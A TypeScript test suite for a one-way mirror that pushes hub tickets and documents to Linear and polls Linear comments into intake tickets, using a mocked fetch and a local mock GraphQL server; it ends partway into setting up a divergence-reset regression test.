// P7 one-way Linear mirror (+ the D5 doc mirror & comment→intake poller). Two layers:
//  (1) adapter UNIT tests with an injected fetchImpl — the REAL createIssue/updateIssue/findByMarker/
//      gql-error/timeout branches of linear.ts (no live Linear), incl. the §16 token-never-thrown property,
//      plus the D5 doc transport (createDocument/updateDocument/findDocByMarker/getDocumentContent/
//      listDocComments human-vs-bot attribution).
//  (2) tool DRYRUN tests over the stdio server — create-then-update idempotency via mirror_map, the
//      incremental hash-skip, the split-brain banner + [hub:id] marker in the body, NO delete path,
//      secret-never-returned, ONE-WAY (no pull/import tool), stateMap fallback, per-project isolation;
//      D5: the doc projection (published strategy/roadmap/decisions + latest design; notes never), the
//      [hub:doc:<slug>] marker + pinned banner, published-only re-mirroring, and mirror.pollComments
//      (comment → needs-pm intake with provenance, body-edit divergence flag, acted-ledger dedup, DRYRUN).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";
import { createServer } from "node:http";
import { createIssue, updateIssue, findByMarker, createDocument, updateDocument, findDocByMarker,
  getDocumentContent, listDocComments, type FetchImpl } from "../src/linear.ts";

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── Layer 1: adapter units with a mock fetchImpl ─────────────────────────────
function mockFetch(handler: (url: string, init: { body?: string; headers?: Record<string, string> }) => { status: number; body: unknown } | "hang"): FetchImpl {
  return (async (url: string, init: { body?: string; headers?: Record<string, string>; signal?: AbortSignal }) => {
    const r = handler(String(url), init ?? {});
    if (r === "hang") return await new Promise<Response>((_, reject) =>
      init?.signal?.addEventListener("abort", () => reject(Object.assign(new Error("aborted"), { name: "AbortError" }))));
    return { status: r.status, json: async () => r.body } as unknown as Response;
  }) as FetchImpl;
}

// createIssue → Authorization carries the token, input carries teamId+title, returns the id
{
  let seen: { headers?: Record<string, string>; body?: string } = {};
  const f = mockFetch((_u, init) => { seen = init; return { status: 200, body: { data: { issueCreate: { success: true, issue: { id: "lin_1" } } } } }; });
  const id = await createIssue(f, "lin_api_SECRET", "team_1", "proj_1", { title: "T [hub:CH-1]", description: "body", priority: 1 });
  ok(id === "lin_1" && seen.headers!.Authorization === "lin_api_SECRET" && JSON.parse(seen.body!).variables.i.teamId === "team_1", "createIssue → id returned, token in Authorization, teamId in input");
  ok(JSON.parse(seen.body!).variables.i.priority === 1, "L2: createIssue sends native Linear priority (0-4), not just body text");
}
// priority omitted ⇒ the field is not sent (no accidental priority:0/None on an unset ticket)
{
  let seen: { body?: string } = {};
  const f = mockFetch((_u, init) => { seen = init; return { status: 200, body: { data: { issueCreate: { success: true, issue: { id: "lin_2" } } } } }; });
  await createIssue(f, "tok", "team_1", null, { title: "no prio", description: "b" });
  ok(!("priority" in JSON.parse(seen.body!).variables.i), "L2: createIssue omits priority when unset (no forced None)");
}

// gql error → throws the Linear message, never the token
{
  const f = mockFetch(() => ({ status: 200, body: { errors: [{ message: "Authentication required" }] } }));
  let msg = "";
  try { await createIssue(f, "lin_api_SECRET", "t", null, { title: "x", description: "y" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("Authentication required") && !msg.includes("SECRET"), "gql error → throws the Linear message, never the token (§16)");
}

// non-200 → throws status only
{
  const f = mockFetch(() => ({ status: 429, body: {} }));
  let msg = "";
  try { await updateIssue(f, "lin_api_SECRET", "lin_1", { title: "x", description: "y" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("429") && !msg.includes("SECRET"), "non-200 → throws the http status, never the token");
}

// findByMarker → returns the matching id, else null
{
  const f = mockFetch(() => ({ status: 200, body: { data: { issues: { nodes: [{ id: "lin_existing" }] } } } }));
  ok((await findByMarker(f, "tok", "[hub:CH-1]")) === "lin_existing", "findByMarker → returns the reconciled id");
  const f0 = mockFetch(() => ({ status: 200, body: { data: { issues: { nodes: [] } } } }));
  ok((await findByMarker(f0, "tok", "[hub:CH-9]")) === null, "findByMarker → null when no match");
}

// ── D5 doc transport units (same §16 posture as the issue adapters above) ──
// createDocument → token in Authorization, projectId parents the Document, returns the id
{
  let seen: { headers?: Record<string, string>; body?: string } = {};
  const f = mockFetch((_u, init) => { seen = init; return { status: 200, body: { data: { documentCreate: { success: true, document: { id: "lindoc_9" } } } } }; });
  const id = await createDocument(f, "lin_api_SECRET", "lproj_1", { title: "Strat [hub:doc:strat]", content: "body" });
  ok(id === "lindoc_9" && seen.headers!.Authorization === "lin_api_SECRET" && JSON.parse(seen.body!).variables.i.projectId === "lproj_1",
    "D5: createDocument → id returned, token in Authorization, the Linear projectId parents the Document");
}
// a reported create/update failure → a clean thrown message, never the token (§16)
{
  const f = mockFetch(() => ({ status: 200, body: { data: { documentCreate: { success: false } } } }));
  let msg = ""; try { await createDocument(f, "lin_api_SECRET", "p", { title: "t", content: "c" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("documentCreate failed") && !msg.includes("SECRET"), "D5: a failed documentCreate throws a clean error, never the token (§16)");
  const fu = mockFetch(() => ({ status: 200, body: { data: { documentUpdate: { success: false } } } }));
  let msgU = ""; try { await updateDocument(fu, "lin_api_SECRET", "lindoc_9", { title: "t", content: "c" }); } catch (e) { msgU = (e as Error).message; }
  ok(msgU.includes("documentUpdate failed") && !msgU.includes("SECRET"), "D5: a failed documentUpdate throws a clean error, never the token (§16)");
}
// findDocByMarker → the reconciled Document id, else null
{
  const f = mockFetch(() => ({ status: 200, body: { data: { documents: { nodes: [{ id: "lindoc_x" }] } } } }));
  ok((await findDocByMarker(f, "tok", "[hub:doc:strat]")) === "lindoc_x", "D5: findDocByMarker → returns the reconciled Document id");
  const f0 = mockFetch(() => ({ status: 200, body: { data: { documents: { nodes: [] } } } }));
  ok((await findDocByMarker(f0, "tok", "[hub:doc:none]")) === null, "D5: findDocByMarker → null when no match");
}
// getDocumentContent → the upstream body; null when the Document is gone
{
  const f = mockFetch(() => ({ status: 200, body: { data: { document: { content: "upstream body" } } } }));
  ok((await getDocumentContent(f, "tok", "lindoc_9")) === "upstream body", "D5: getDocumentContent → the upstream body (poller read, never state import)");
  const f0 = mockFetch(() => ({ status: 200, body: { data: { document: null } } }));
  ok((await getDocumentContent(f0, "tok", "lindoc_gone")) === null, "D5: getDocumentContent → null for a deleted Document");
}
// listDocComments → human vs bot attribution (user-authored ⇒ isHuman; a botActor comment is not)
{
  const f = mockFetch(() => ({ status: 200, body: { data: { comments: { nodes: [
    { id: "c1", body: "human words", url: "https://linear.app/c/1", createdAt: "2026-07-12T00:00:00Z", user: { id: "u1" }, botActor: null },
    { id: "c2", body: "bot words", url: null, createdAt: "2026-07-12T00:00:01Z", user: null, botActor: { id: "b1" } },
  ] } } } }));
  const cs = await listDocComments(f, "tok", "lindoc_9");
  ok(cs.length === 2 && cs[0].isHuman === true && cs[0].url === "https://linear.app/c/1" && cs[1].isHuman === false,
    "D5: listDocComments maps human vs bot comments (botActor ⇒ isHuman:false)");
}
// listDocComments follows the pagination cursor — a busy doc's page-2 comments are not silently dropped
{
  const afters: (string | null | undefined)[] = [];
  const f = mockFetch((_u, init) => {
    const after = JSON.parse(init.body!).variables.after; afters.push(after);
    return after == null
      ? { status: 200, body: { data: { comments: { nodes: [{ id: "p1", body: "page one", user: { id: "u1" }, botActor: null }], pageInfo: { hasNextPage: true, endCursor: "cur1" } } } } }
      : { status: 200, body: { data: { comments: { nodes: [{ id: "p2", body: "page two", user: { id: "u1" }, botActor: null }], pageInfo: { hasNextPage: false, endCursor: null } } } } };
  });
  const cs = await listDocComments(f, "tok", "lindoc_9");
  ok(cs.length === 2 && cs[1].id === "p2" && afters.length === 2 && afters[1] === "cur1",
    "D5: listDocComments paginates via pageInfo.endCursor (page-2 comments are collected)");
}

// timeout — a hung Linear aborts fast and never wedges the fire
{
  process.env.DEVLOOP_MIRROR_TIMEOUT_MS = "250";
  const f = mockFetch(() => "hang");
  let msg = ""; const t0 = Date.now();
  try { await createIssue(f, "tok", "t", null, { title: "x", description: "y" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("timeout") && Date.now() - t0 < 2000, "a hung Linear → fast timeout error (never wedges the fire)");
  delete process.env.DEVLOOP_MIRROR_TIMEOUT_MS;
}

// ── Layer 2: tool tests over the stdio server, against a MOCK Linear endpoint ────────────────
// A DRYRUN push must be write-free (DL-11), so it can no longer be used to exercise the persistence
// path. Instead we stand up a mock Linear GraphQL endpoint (the server's endpoint is env-overridable,
// DEVLOOP_LINEAR_API_URL) and run REAL pushes against it — restoring create/update/skip coverage on
// actual mirror_map persistence — plus dedicated DL-11 dry-run assertions.
const DB = "/tmp/hub-mirror/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }
// D5: the poller's machine-local acted-ledger lives under devloopDataDir() — point it at an isolated temp
// dir (never the real ~/.dev-loop; the build-artifact leak lesson) and start clean.
const DATA = "/tmp/hub-mirror/data";
rmSync(DATA, { recursive: true, force: true });

// The mock records every mutation it receives (so we can assert the wire payload) and returns success;
// findByMarker/findDocByMarker always return no match → the create path runs for a new ticket/doc.
// D5 state: `upstreamDocs` is what "Linear" currently holds per Document id (documentCreate/Update write it,
// the poller's getDocumentContent reads it — mutate it directly to simulate a rogue Linear-side body edit);
// `docComments` feeds the poller's listDocComments per Document id.
let linCounter = 0, docCounter = 0;
let linSent: { kind: string; vars: any }[] = [];
const upstreamDocs: Record<string, { title: string; content: string }> = {};
const docComments: Record<string, { id: string; body: string; url: string | null; createdAt: string; user: { id: string } | null; botActor: { id: string } | null }[]> = {};
const mockLinear = createServer((req, res) => {
  let raw = ""; req.on("data", (c) => { raw += c; });
  req.on("end", () => {
    let data: Record<string, unknown> = {};
    try {
      const { query, variables } = JSON.parse(raw);
      const q = String(query ?? "");
      if (q.includes("issues(")) { linSent.push({ kind: "find", vars: variables }); data = { issues: { nodes: [] } }; }
      else if (q.includes("issueCreate")) { linSent.push({ kind: "create", vars: variables }); data = { issueCreate: { success: true, issue: { id: `lin_${++linCounter}` } } }; }
      else if (q.includes("issueUpdate")) { linSent.push({ kind: "update", vars: variables }); data = { issueUpdate: { success: true } }; }
      else if (q.includes("documents(")) { linSent.push({ kind: "findDoc", vars: variables }); data = { documents: { nodes: [] } }; }
      else if (q.includes("documentCreate")) {
        const id = `lindoc_${++docCounter}`;
        upstreamDocs[id] = { title: variables.i.title, content: variables.i.content };
        linSent.push({ kind: "docCreate", vars: variables });
        data = { documentCreate: { success: true, document: { id } } };
      } else if (q.includes("documentUpdate")) {
        upstreamDocs[variables.id] = { title: variables.i.title, content: variables.i.content };
        linSent.push({ kind: "docUpdate", vars: variables });
        data = { documentUpdate: { success: true } };
      } else if (q.includes("comments(")) { linSent.push({ kind: "comments", vars: variables }); data = { comments: { nodes: docComments[variables.docId] ?? [] } }; }
      else if (q.includes("document(")) { linSent.push({ kind: "docContent", vars: variables }); data = { document: upstreamDocs[variables.id] ? { content: upstreamDocs[variables.id].content } : null }; }
    } catch { /* malformed → {} */ }
    const out = JSON.stringify({ data });
    res.writeHead(200, { "content-type": "application/json", "content-length": Buffer.byteLength(out) }); res.end(out);
  });
});
await new Promise<void>((r) => mockLinear.listen(0, "127.0.0.1", () => r()));
const MOCK_URL = `http://127.0.0.1:${(mockLinear.address() as { port: number }).port}/graphql`;

async function as(actor: string, project: string, opts: { dryrun?: boolean; prefix?: string } = {}): Promise<Client> {
  const env: Record<string, string> = {
    ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB,
    DEVLOOP_CREATE_PROJECT: "1", DEVLOOP_LINEAR_TOKEN: "lin_api_SECRET", DEVLOOP_LINEAR_API_URL: MOCK_URL,
    DEVLOOP_DATA_DIR: DATA, // D5: the poller's acted-ledger stays in the test sandbox
  };
  if (opts.dryrun) env.DEVLOOP_MIRROR_DRYRUN = "1";
  if (opts.prefix) env.DEVLOOP_TICKET_PREFIX = opts.prefix;
  const c = new Client({ name: `mir-${actor}-${project}`, version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<{ isError: boolean; data: any }> {
  const r = await c.callTool({ name, arguments: args }) as { isError?: boolean; content?: { text?: string }[] };
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}
const PUSH = { teamId: "team_1", tokenEnv: "DEVLOOP_LINEAR_TOKEN", stateMap: { "In Review": "lin_state_review" } };

// ── DL-11: a DRYRUN push is WRITE-FREE — it previews ops but persists NOTHING and hits no network ──
const dry = await as("sweep", "dryp", { dryrun: true, prefix: "DRY" });
const dt = (await call(dry, "save_issue", { title: "Dry ticket", type: "Feature" })).data;
const dp1 = (await call(dry, "mirror.push", PUSH)).data;
ok(dp1.created === 1 && dp1.dryrun === true && dp1.ops?.length === 1, "DRYRUN push → previews 1 create op (dryrun:true)");
ok(dp1.ops[0].title.includes(`[hub:${dt.id}]`) && dp1.ops[0].body.includes("Mirrored from the dev-loop hub"), "DRYRUN op carries the [hub:id] marker + split-brain banner");
const dstat = (await call(dry, "mirror.status")).data;
ok(dstat.mapped === 0 && dstat.lastPush === null, "DL-11: after a DRYRUN push, mirror_map is EMPTY (mapped:0, lastPush:null)");
ok((await call(dry, "mirror.push", PUSH)).data.created === 1, "DL-11: a 2nd DRYRUN still reports 1 create — it is stateless (no persisted dry-run row to skip on)");
ok(linSent.length === 0, "DL-11: a DRYRUN makes NO network call to Linear (the mock received nothing)");

// ── DL-11 AC(b): a real (live) push AFTER a dry-run still CREATES — the dry-run left no poisoned map ──
const dryLive = await as("sweep", "dryp", { prefix: "DRY" }); // same project, LIVE now
const dlp = (await call(dryLive, "mirror.push", PUSH)).data;
ok(dlp.created === 1 && dlp.skipped === 0 && !dlp.dryrun, "DL-11: a live push after a dry-run CREATES (not skipped on a poisoned hash, not pointed at a dry-<id>)");
ok((await call(dryLive, "mirror.status")).data.mapped === 1, "DL-11: the live push actually mapped the ticket (dryp now mapped:1)");

// ── LIVE pushes against the mock — the real mirror_map persistence path (create/update/skip) ──
linSent = [];
const sweep = await as("sweep", "mirp", { prefix: "MR" });
const beta = await as("sweep", "betap", { prefix: "MB" }); // second project for isolation
const t1 = (await call(sweep, "save_issue", { title: "First ticket", type: "Feature" })).data;
const t2 = (await call(sweep, "save_issue", { title: "Second ticket", type: "Bug" })).data;

// first live push → both created + persisted; the create sent to Linear carries the banner + [hub:id] marker
const p1 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p1.created === 2 && p1.updated === 0 && !p1.dryrun, "live mirror.push → 2 created (persisted)");
ok((await call(sweep, "mirror.status")).data.mapped === 2, "mirror.status → 2 mapped (live push persisted)");
const c1 = linSent.find((s) => s.kind === "create" && s.vars.i.title.includes(`[hub:${t1.id}]`));
ok(!!c1 && c1.vars.i.description.includes("Mirrored from the dev-loop hub"), "the create sent to Linear carries the [hub:id] marker + split-brain banner");

// second push, no change → all skipped (incremental hash-skip over the PERSISTED map)
const p2 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p2.created === 0 && p2.skipped === 2, "re-push with no change → 2 skipped (incremental hash-skip)");

// change one ticket → only it is re-pushed as an UPDATE to its persisted linear_id, with the mapped stateId
await call(sweep, "save_issue", { id: t1.id, state: "In Review" });
linSent = [];
const p3 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p3.updated === 1 && p3.skipped === 1, "after editing one ticket → 1 updated, 1 skipped");
const u3 = linSent.find((s) => s.kind === "update");
ok(!!u3 && u3.vars.i.stateId === "lin_state_review", "the changed ticket → issueUpdate sent with the mapped stateId");

// stateMap fallback — a state with no mapping pushes with NO stateId, never fails
await call(sweep, "save_issue", { id: t2.id, state: "Done" }); // 'Done' not in stateMap
linSent = [];
const p4 = (await call(sweep, "mirror.push", PUSH)).data;
const u4 = linSent.find((s) => s.kind === "update");
ok(p4.failed === 0 && !!u4 && u4.vars.i.stateId == null, "unmapped state → no stateId in the update, push does NOT fail (fallback)");

// cancel → still mirrored as an update, NEVER deleted (no delete op exists at all).
// t2 is Done here, and Done → Canceled is an OPERATOR move since the P1-1 terminal-state guard
// (agents cannot exit a terminal state) — so the cancel rides an operator client.
const oper = await as("operator", "mirp", { prefix: "MR" });
await call(oper, "save_issue", { id: t2.id, state: "Canceled" });
const p5 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p5.failed === 0 && p5.updated >= 1, "a Canceled ticket → update op, NEVER a delete (no data-loss)");

// §16 — the token never appears in any result
ok(!JSON.stringify(p1).includes("SECRET") && !JSON.stringify(await call(sweep, "mirror.status")).includes("SECRET"), "the Linear token never appears in a tool result (§16)");

// ONE-WAY — there is NO pull/import/sync-from-Linear tool (the hub never reads Linear as truth)
const tools = (await sweep.listTools()).tools.map((t: any) => t.name);
ok(tools.includes("mirror.push") && tools.includes("mirror.status") && !tools.some((n: string) => /mirror\.(pull|import|sync|fetch)/.test(n)), "ONE-WAY: only mirror.push/status exist — no pull/import tool");

// isolation — pushing project A maps nothing in project B
ok((await call(beta, "mirror.status")).data.mapped === 0, "a different project's mirror_map is empty (isolation)");

// ═══ D5: the one-way DOC mirror (published strategy/roadmap/decisions + latest design → Linear Documents) ═══
const docsW = await as("sweep", "docp", { prefix: "DC" });
const docsOp = await as("operator", "docp", { prefix: "DC" }); // publish is operator-gated
const docsDry = await as("sweep", "docp", { dryrun: true, prefix: "DC" });
await call(docsW, "doc.save", { slug: "strat", kind: "strategy", title: "North Star", body: "goal one", baseVersion: 0 });
await call(docsOp, "doc.publish", { slug: "strat", version: 1 });
const PUSH_P = { ...PUSH, projectId: "lproj_1" };

// no Linear projectId → docs skip WHOLESALE with a visible note (Documents parent to the mirrored project)
linSent = [];
const np = (await call(docsW, "mirror.push", PUSH)).data;
ok(np.docs.created === 0 && np.docs.skipped === 0 && String(np.docs.note).includes("no Linear projectId"),
  "D5: push without a Linear projectId → docs skip wholesale, visible via docs.note (never a silent drop)");
ok(!linSent.some((s) => s.kind.startsWith("doc")), "D5: the projectId-less push made NO doc network call");

// DRYRUN doc push → previews the doc.create op (marker + pinned banner + provenance), persists/pushes NOTHING
linSent = [];
const dd = (await call(docsDry, "mirror.push", PUSH_P)).data;
ok(dd.docs.created === 1 && dd.dryrun === true, "D5/DL-11: DRYRUN doc push → previews 1 doc create");
const dop = dd.ops.find((o: any) => o.op === "doc.create");
ok(!!dop && dop.title.endsWith("[hub:doc:docp/strat]") && dop.body.split("\n")[0].includes("Mirrored from dev-loop") && dop.body.includes("body edits here are overwritten"),
  "D5: the doc op carries the [hub:doc:<projectKey>/<slug>] title marker + the one-way banner PINNED as the first line");
ok(dop.body.includes("**hub doc:** strat") && dop.body.includes("**version:** v1") && dop.body.includes("goal one"),
  "D5: the doc body carries provenance (slug · kind · version) + the published content");
ok(linSent.length === 0, "D5/DL-11: a DRYRUN doc push makes NO network call to Linear");
ok((await call(docsW, "mirror.status")).data.docsMapped === 0, "D5/DL-11: after a DRYRUN doc push, NO doc mapping row persisted");

// live push → documentCreate parented to the Linear project; status grows the additive doc fields
linSent = [];
const lp1 = (await call(docsW, "mirror.push", PUSH_P)).data;
ok(lp1.docs.created === 1 && lp1.docs.failed === 0 && !lp1.dryrun, "D5: live push with a Linear projectId → 1 doc created");
const dc1 = linSent.find((s) => s.kind === "docCreate");
ok(!!dc1 && dc1.vars.i.projectId === "lproj_1" && dc1.vars.i.title.endsWith("[hub:doc:docp/strat]") && dc1.vars.i.content.split("\n")[0].includes("Mirrored from dev-loop"),
  "D5: documentCreate parents the Document to the mirrored Linear project, marker in title, banner pinned");
const dst = (await call(docsW, "mirror.status")).data;
ok(dst.docsMapped === 1 && dst.docs === 1, "D5: mirror.status → docsMapped:1 / docs:1 (additive fields; ticket counts untouched)");

// idempotency: unchanged → skip; a NEW DRAFT stays private (published-versions-only); publish → update
ok((await call(docsW, "mirror.push", PUSH_P)).data.docs.skipped === 1, "D5: re-push with no doc change → skipped (content-hash discipline)");
await call(docsW, "doc.save", { slug: "strat", kind: "strategy", body: "goal two", baseVersion: 1 });
const lpDraft = (await call(docsW, "mirror.push", PUSH_P)).data;
ok(lpDraft.docs.skipped === 1 && lpDraft.docs.updated === 0, "D5: an unpublished DRAFT does not re-mirror — drafts stay private until the operator publishes");
await call(docsOp, "doc.publish", { slug: "strat", version: 2 });
linSent = [];
const lpPub = (await call(docsW, "mirror.push", PUSH_P)).data;
const du1 = linSent.find((s) => s.kind === "docUpdate");
ok(lpPub.docs.updated === 1 && !!du1 && du1.vars.id === "lindoc_1" && du1.vars.i.content.includes("goal two") && du1.vars.i.content.includes("**version:** v2"),
  "D5: publishing v2 → documentUpdate of the SAME Linear Document with the new body + version line");

// design docs mirror their LATEST version (latest-is-live, no publish gate); notes NEVER mirror
await call(docsW, "doc.save", { slug: "auth", kind: "design", title: "Auth design", body: "v1 design", baseVersion: 0 });
ok((await call(docsW, "mirror.push", PUSH_P)).data.docs.created === 1, "D5: a design doc mirrors from its LATEST draft — no publish gate (latest-is-live)");
await call(docsW, "doc.save", { slug: "auth", kind: "design", body: "v2 design", baseVersion: 1 });
linSent = [];
const lpDesign = (await call(docsW, "mirror.push", PUSH_P)).data;
const du2 = linSent.find((s) => s.kind === "docUpdate");
ok(lpDesign.docs.updated === 1 && lpDesign.docs.skipped === 1 && !!du2 && du2.vars.i.content.includes("v2 design"),
  "D5: a NEW design draft re-mirrors immediately; the unchanged strategy doc hash-skips");
await call(docsW, "doc.save", { slug: "scratch", kind: "notes", body: "private notes", baseVersion: 0 });
await call(docsOp, "doc.publish", { slug: "scratch", version: 1 });
const lpNotes = (await call(docsW, "mirror.push", PUSH_P)).data;
ok(lpNotes.docs.created === 0 && (await call(docsW, "mirror.status")).data.docs === 2,
  "D5: 'notes' NEVER mirrors even when published (scratch tier) — the mirrorable set stays strategy+design");

// cross-project slug collision: a SECOND project's same-slug doc gets its OWN marker (projectKey
// discriminator) — without it, reconcile-by-marker would adopt and overwrite project A's Document.
const docsW2 = await as("sweep", "docp2", { prefix: "D2" });
const docsOp2 = await as("operator", "docp2", { prefix: "D2" });
await call(docsW2, "doc.save", { slug: "strat", kind: "strategy", title: "Other North Star", body: "other goal", baseVersion: 0 });
await call(docsOp2, "doc.publish", { slug: "strat", version: 1 });
linSent = [];
const lpB = (await call(docsW2, "mirror.push", { ...PUSH, projectId: "lproj_2" })).data;
const dcB = linSent.find((s) => s.kind === "docCreate");
const fdB = linSent.find((s) => s.kind === "findDoc");
ok(lpB.docs.created === 1 && !!dcB && dcB.vars.i.title.endsWith("[hub:doc:docp2/strat]") && !!fdB && String(fdB.vars.q) === "[hub:doc:docp2/strat]",
  "D5: a same-slug doc in ANOTHER project pushes + reconciles under its OWN [hub:doc:<key>/<slug>] marker (no cross-project adoption)");

// ═══ D5: mirror.pollComments — comment → needs-pm intake, divergence flag, acted-ledger dedup, DRYRUN ═══
const POLL = { tokenEnv: "DEVLOOP_LINEAR_TOKEN" };
// a project with no pushed docs → a clean no-op
const pl0 = (await call(beta, "mirror.pollComments", POLL)).data;
ok(pl0.docs === 0 && pl0.filed === 0 && pl0.failed === 0, "D5: pollComments on a project with no pushed docs → clean no-op");
// one HUMAN + one bot comment upstream → exactly ONE needs-pm Backlog intake, provenance in the body
docComments["lindoc_1"] = [
  { id: "cmt_h1", body: "Please prioritize migrations\nsecond line", url: "https://linear.app/x/comment/1", createdAt: "2026-07-12T00:00:00Z", user: { id: "u1" }, botActor: null },
  { id: "cmt_b1", body: "integration noise", url: null, createdAt: "2026-07-12T00:00:01Z", user: null, botActor: { id: "b1" } },
];
const pl1 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(pl1.docs === 2 && pl1.comments === 1 && pl1.filed === 1 && pl1.divergences === 0 && !pl1.dryrun,
  "D5: poll → the 1 unseen HUMAN comment files 1 intake (the bot comment is ignored), no divergence");
const intake = (await call(docsW, "list_issues", { state: "Backlog", label: "needs-pm" })).data;
ok(intake.length === 1 && intake[0].labels.includes("dev-loop") && intake[0].labels.includes("pm") && intake[0].state === "Backlog",
  "D5: exactly ONE intake ticket, staged Backlog with the §9a carrier labels (dev-loop + pm + needs-pm)");
ok(intake[0].title.includes("'strat'") && intake[0].title.includes("Please prioritize migrations"),
  "D5: the intake title names the doc slug + the comment's first line");
ok(intake[0].description.includes("**strat**") && intake[0].description.includes("mirrored v2") && intake[0].description.includes("> Please prioritize migrations") && intake[0].description.includes("https://linear.app/x/comment/1"),
  "D5: provenance — doc slug + mirrored version + quoted text + comment URL all ride the intake body");
// acted-ledger dedup: a re-poll files nothing
const pl2 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(pl2.filed === 0 && pl2.alreadyActed === 1 && (await call(docsW, "list_issues", { state: "Backlog", label: "needs-pm" })).data.length === 1,
  "D5: a re-poll files NOTHING — the machine-local acted-ledger de-dupes the seen comment");
// body-edit divergence: a rogue Linear-side edit → ONE High needs-pm flag; same divergence never re-files
upstreamDocs["lindoc_1"].content += "\nrogue Linear edit";
const pl3 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(pl3.divergences === 1 && pl3.filed === 1, "D5: an upstream BODY edit → ONE divergence intake filed (never written back)");
const divT = (await call(docsW, "list_issues", { state: "Backlog", query: "Linear-side edit" })).data;
ok(divT.length === 1 && divT[0].priority === 2 && divT[0].description.includes("OVERWRITE"),
  "D5: the divergence ticket is High (one push from deletion) + says the next push overwrites");
const pl4 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(pl4.divergences === 0 && pl4.filed === 0, "D5: the SAME divergence files only once (upstream-hash dedup in the ledger)");
upstreamDocs["lindoc_1"].content += "\nanother rogue edit";
ok((await call(docsW, "mirror.pollComments", POLL)).data.filed === 1, "D5: a DIFFERENT upstream edit is a NEW divergence → filed again");
// the PENDING-PUSH window (Codex review): the hub publishes v3 (not yet pushed) AND a human edits the Linear
// body — the divergence must STILL be flagged (baseline = the last-PUSHED body, not the current projection),
// with provenance naming the version Linear actually held (v2).
await call(docsW, "doc.save", { slug: "strat", kind: "strategy", body: "goal three", baseVersion: 2 });
await call(docsOp, "doc.publish", { slug: "strat", version: 3 });
upstreamDocs["lindoc_1"].content += "\nrogue edit during pending push";
const plPend = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(plPend.divergences === 1 && plPend.filed === 1,
  "D5: a Linear-side edit while a NEWER hub version awaits its push is STILL flagged (pushed-body baseline)");
const pendT = (await call(docsW, "list_issues", { state: "Backlog", query: "Linear-side edit" })).data;
ok(pendT.some((t: any) => t.description.includes("pushed v2")),
  "D5: the pending-push divergence provenance names the version Linear held (pushed v2), not the moved-on hub version");
// DRYRUN poll: Linear is READ, but nothing is filed and no ledger byte is written
docComments["lindoc_1"].push({ id: "cmt_h2", body: "dry-run visible comment", url: null, createdAt: "2026-07-12T01:00:00Z", user: { id: "u2" }, botActor: null });
linSent = [];
const dpoll = (await call(docsDry, "mirror.pollComments", POLL)).data;
ok(dpoll.dryrun === true && dpoll.ops?.some((o: any) => o.op === "comment-intake" && o.title.includes("dry-run visible comment")),
  "D5/DL-11: DRYRUN poll previews the would-file intake ops");
ok(linSent.some((s) => s.kind === "comments"), "D5: a DRYRUN poll still READS Linear (reads are side-effect-free)");
ok((await call(docsW, "list_issues", { state: "Backlog", query: "dry-run visible" })).data.length === 0, "D5/DL-11: the DRYRUN poll filed NO ticket");
const plLive = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(plLive.filed === 1 && (await call(docsW, "list_issues", { state: "Backlog", query: "dry-run visible" })).data.length === 1,
  "D5/DL-11: a LIVE poll after the dry-run still files it — the dry-run left no ledger byte");
// §16 + input hygiene: a literal secret as tokenEnv is refused and never echoed; results carry no token
const badPoll = await call(docsW, "mirror.pollComments", { tokenEnv: "lin_api_LITERAL!" });
ok(badPoll.isError && !JSON.stringify(badPoll.data).includes("lin_api_LITERAL"), "D5/§16: a literal token value as tokenEnv → clean error, value never echoed");
ok(!JSON.stringify([pl1, pl3, plLive, lpPub]).includes("SECRET"), "D5/§16: the Linear token never appears in any doc-push/poll result");
// ONE-WAY stays one-way: the poller added no pull/import tool and never wrote hub docs from Linear
const dTools = (await docsW.listTools()).tools.map((t: any) => t.name);
ok(dTools.includes("mirror.pollComments") && !dTools.some((n: string) => /mirror\.(pull|import|sync|fetch)/.test(n)),
  "D5: mirror.pollComments exists, and there is STILL no pull/import/sync tool (intake only, one-way)");
const stratNow = (await call(docsW, "doc.get", { slug: "strat", version: "latest" })).data;
ok(!String(stratNow.body).includes("rogue"), "D5: the Linear-side edit was NEVER imported into the hub doc (flag, don't write back)");

// ═══ D5 divergence-dedupe RESET (Phase 4 nit): a push-overwrite invalidates the filed divergence ═══
// ledger.divergence[slug] keys on the upstream content hash and was never cleared after a push
// OVERWROTE the diverged upstream — so a human RE-APPLYING the byte-identical edit was silently never
// re-filed. The poller now reconciles against last_pushed_at (the push side's existing record, stamped
// on every non-skip doc push): an entry filed BEFORE the last stamping push is stale and is dropped.
// Regression: divergence filed → push overwrites → the SAME edit re-applied → a SECOND ticket is filed.
await call(docsW, "doc.save", { slug: "gadget", kind: "design", title: "Gadget design", body: "gadget v1", baseVersion: 0 });
ok((await call(docsW, "mirror.push", PUSH_P)).data.docs.created === 1, "dedupe-reset setup: the gadget design doc pushed (design mirrors its latest)");
const gadgetId = Object.entries(upstreamDocs).find(([, v]) => v.title.includes("[hub:doc:docp/gadget]"))![0];
const gTickets = async () => (await call(docsW, "list_issues", { state: "Backlog", query: "gadget" })).data
  .filter((t: any) => t.title.includes("Linear-side edit")).length;
